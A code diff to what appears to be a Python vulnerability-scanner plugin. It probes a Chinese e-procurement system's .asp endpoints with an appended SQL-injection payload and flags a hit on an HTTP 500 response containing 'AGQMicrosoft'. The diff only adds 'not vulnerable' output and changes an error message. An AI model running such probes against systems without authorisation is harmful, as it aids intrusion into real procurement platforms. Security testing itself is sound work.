@@ -30,14 +30,18 @@ class caitong_multi_sqli_BaseVerify:
                 "/Rat/EBid/ViewClarify.asp?InviteId=11",
                 "/Rat/EBid/AuditForm/AuditForm_ExpertForm.asp?InviteId=11"]
         try:
+            noexist = True
             for turl in urls:
                 vulnurl = self.url + turl + payload
                 req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
                 if req.status_code ==500 and r"AGQMicrosoft" in req.text:
                     cprint("[+]存在北京网达信联电子采购系统注入漏洞...(高危)\tpayload: "+vulnurl, "red")
+                    noexist = False
+            if noexist:
+                cprint("[-]不存在caitong_multi_sqli漏洞", "white", "on_grey")
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
